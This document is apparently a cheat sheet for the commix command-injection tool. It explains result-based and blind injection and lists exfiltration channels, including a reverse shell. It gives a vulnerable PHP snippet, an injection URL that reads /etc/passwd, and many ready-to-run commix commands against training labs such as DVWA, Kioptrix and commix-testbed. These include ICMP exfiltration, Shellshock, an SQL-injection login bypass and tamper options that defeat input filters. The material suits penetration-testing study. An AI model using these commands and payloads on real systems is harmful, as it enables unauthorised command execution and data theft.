commix
COMMand Injection eXploiter
=====================
https://github.com/commixproject/commix/wiki/Usage-Examples
https://github.com/commixproject/commix/wiki/Filters-Bypasses

Command injection/os injection/shell injection occurs when user input is not sufficiently checked, if at all.
Special case SQL command injection (sqlmap)

----------------------------------------------------------------

Result based command injection:
- Results are visible
- Directly inferrable if injection succeeded

example:
<? php
echo system("ping -nc 4 " . $_GET["addr"]);
?>

http://vulnerable.app/index.php?addr=127.0.0.1;cat%20/etc/passwd

----------------------------------------------------------------

Blind command injection:
- Results are not displayed to the user
- Must be inferred by other means (results are not visible)
- Date must be extracted via another mechanism

Inferring:
Time based blind
Ping attacker machine and listen with wireshark

Extraction:
DNS request extraction
PING extraction
HTTP request extraction (user agent, uri, etc)
Reverse shell
Time based with scripts (STR=$(whoami), if str len = 5 then sleep 1 else sleep 0...)
Write results to file in web directory which we can access


===============================================================================

1. Exploiting Damn Vulnerable Web Application:

    Low level OS command injection:

python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=low; PHPSESSID=nq30op434117mo7o2oe5bl7is4"

    Medium level OS command injection:

python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"

    High level OS command injection:

python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=high; PHPSESSID=nq30op434117mo7o2oe5bl7is4" --technique=f --web-root="/var/www/html/"
2. Exploiting php-Charts 1.0:

Exploitation via using custom injection payload suffix and prefix string:

python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test" --prefix="'" --suffix="//"
3. Exploiting OWASP Mutillidae:

Exploitation via using extra HTTP headers and HTTP proxy:

python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php" --data="target_host=127.0.0.1" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
4. Exploiting Persistence:

    Exploitation via using ICMP exfiltration technique:

commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8"

    Exploitation via using an alternative (python) shell:

python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --alter-shell="Python"
5. Exploiting Damn Vulnerable NodeJS Application:

python commix.py --url="http://127.0.0.1:9090/app/ping" --data "address=127.0.0.1" --cookie="connect.sid=s%3AIdvte5ieuGQC5C8jt5aSyUTSF8xZtls8.3fwCVsyypx%2BLGXtiF1JTBrqbmjp%2B29vwKoL0uxcHub8"
6. Exploiting Kioptrix: Level 1.1 (#2):

python commix.py --url="http://192.168.178.2/pingit.php" --data="ip=127.0.0.1E&submit=submit" --auth-url="http://192.168.178.2/index.php" --auth-data="uname=admin&psw=%27+OR+1%3D1--+-&btnLogin=Login"
7. Exploiting Kioptrix: 2014 (#5):

Exploitation via using custom user-agent and specified injection technique:

python commix.py --url="http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&pdf=make" --user-agent="Mozilla/4.0 Mozilla4_browser" --technique="f" --web-root="/"
8. Exploiting CVE-2014-6271/Shellshock:

python commix.py --url="http://192.168.178.4/cgi-bin/status/" --shellshock
9. Exploiting commix-testbed (cookie):

python commix.py --url="http://127.0.0.1/scenarios/cookie/cookie(classic).php" --cookie="addr=127.0.0.1" -p addr
10. Exploiting commix-testbed (user-agent):

python commix.py --url="http://127.0.0.1/scenarios/user-agent/ua(blind).php" -p user-agent
11. Exploiting commix-testbed (referer):

python commix.py --url="http://127.0.0.1/scenarios/referer/referer(classic).php" -p referer
12. Exploiting Flick 2:

Exploitation via using custom HTTP headers and base64 encoding:

python commix.py --url="https://192.168.2.12/do/cmd/*" --headers="X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF" --base64
13. Exploiting commix-testbed (JSON-based):

python commix.py --url="http://127.0.0.1/scenarios/regular/POST/classic_json.php" --data='{"addr":"127.0.0.1","name":"ancst"}'
14. Exploiting SickOs 1.1:

Exploitation via using shellshock module and HTTP proxy:

python commix.py --url="http://192.168.2.8/cgi-bin/status" --shellshock --proxy="192.168.2.8:3128"
15. Exploiting Damn Vulnerable GraphQL Application:

    OS Command Injection #1:

python commix.py --url="http://127.0.0.1:5000/graphql" --data='{"query":"mutation{importPaste(host:\"commixproject.com\" , port:80 , path:\"/\" , scheme:\"http\"){result}}"}'

    OS Command Injection #2:

python commix.py --url="http://127.0.0.1:5000/graphql" --data='{"query":"query {systemDiagnostics(username:\"admin\" , password:\"admin123\" , cmd:\"test\")}"}' -p cmd
16. Exploiting commix-testbed (XML-based):

python commix.py --url="http://127.0.0.1/scenarios/regular/POST/classic_xml.php" --data='<?xml version="1.0" encoding="UTF-8"?><ping><addr>127.0.0.1</addr><count>4</count></ping>'
17. Exploiting Damn Vulnerable Web Sockets:

    Use HTTP2WebSocket to run the listener on port 3333 and connect to dvws.local:8080 web socket app on every HTTP request:

python3 HTTP2WebSocket.py -l 3333 -t ws://dvws.local:8080

    Exploit the OS command execution:

python commix.py -u "http://127.0.0.1:3333/command-execution" --data="addr=127.0.0.1"

============================================================================



Note: The following filters bypasses are based on dockerized version of Commix-testbed.

    Filter lax_domain_name.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/lax_domain_name.php" --data="addr=127.0.0.1" --prefix="a.b.c" --suffix="d.e.f"

    Filter nested_quotes.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/nested_quotes.php" --data="addr=127.0.0.1" --prefix="\"" --suffix="\""

    Filter no_space.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_space.php" --data="addr=127.0.0.1" --tamper="space2ifs"

    Filter no_space_no_colon_no_pipe_no_ampersand.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php" --data="addr=127.0.0.1" --technique=f --web-root="/var/www/commix-testbed.com/public_html/" --tamper="space2htab"

    Filter no_space_no_colon_no_pipe_no_ampersand_no_dollar.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand_no_dollar.php" --data="addr=127.0.0.1" --technique=f --web-root="/var/www/commix-testbed.com/public_html/" --tamper="space2htab"

    Filter no_colon_no_pipe_no_ampersand_no_dollar.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php" --data="addr=127.0.0.1"

    Filter no_white_chars.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_white_chars.php" --data="addr=127.0.0.1" --tamper="space2ifs"

    Filter no_white_chars_start_alphanum.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_white_chars_start_alphanum.php" --data="addr=127.0.0.1" --tamper="space2ifs" --prefix="abc"

    Filter no_white_chars_stop_alnum.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/no_white_chars_stop_alnum.php" --data="addr=127.0.0.1" --tamper="space2ifs"

    Filter simple_stop_alphanum.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/simple_stop_alphanum.php" --data="addr=127.0.0.1" --prefix="abc"

    Filter simple_start_alphanum.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/simple_start_alphanum.php" --data="addr=127.0.0.1"

    Filter multiple_os_commands_blacklisting.php bypass:

python commix.py --url="http://127.0.0.1/scenarios/filters/multiple_os_commands_blacklisting.php" --data="addr=127.0.0.1" --tamper="uninitializedvariable"
